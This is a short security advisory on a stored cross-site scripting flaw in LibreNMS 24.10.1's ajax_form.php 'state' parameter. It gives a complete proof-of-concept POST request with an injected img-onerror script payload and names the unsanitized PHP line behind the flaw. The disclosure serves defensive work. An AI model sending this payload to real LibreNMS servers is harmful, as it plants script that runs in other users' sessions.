title: "LibreNMS Misc Section Stored Cross-site Scripting vulnerability"
description: "# StoredXSS-LibreNMS-MiscSection\n\n\n**Description:**\n\n\nStored XSS
  on the parameter: `ajax_form.php` -> param: state\n\nRequest:\n```http\nPOST /ajax_form.php
  HTTP/1.1\nHost: <your_host>\nX-Requested-With: XMLHttpRequest\nX-CSRF-TOKEN: <your_XSRF_token>\nContent-Type:
  application/x-www-form-urlencoded; charset=UTF-8\nCookie: <your_cookie>\n\ntype=override-config&device_id=1&attrib=override_icmp_disable&state=\"><img%20src%20onerror=\"alert(1)\">
  \n```\n\n\nof Librenms version 24.10.1 ([https://github.com/librenms/librenms](https://github.com/librenms/librenms))
  allows remote attackers to inject malicious scripts. When a user views or interacts
  with the page displaying the data, the malicious script executes immediately, leading
  to potential unauthorized actions or data exposure.\n\n\nThe vulnerability in the
  line:\n```php\n$attrib_val = get_dev_attrib($device, $name);\n```\nwithin the `dynamic_override_config`
  function arises because the value of `$attrib_val is` retrieved from untrusted data
  without any sanitization or encoding (at [Line 778](https://github.com/librenms/librenms/blob/master/includes/html/functions.inc.php#L778)). "
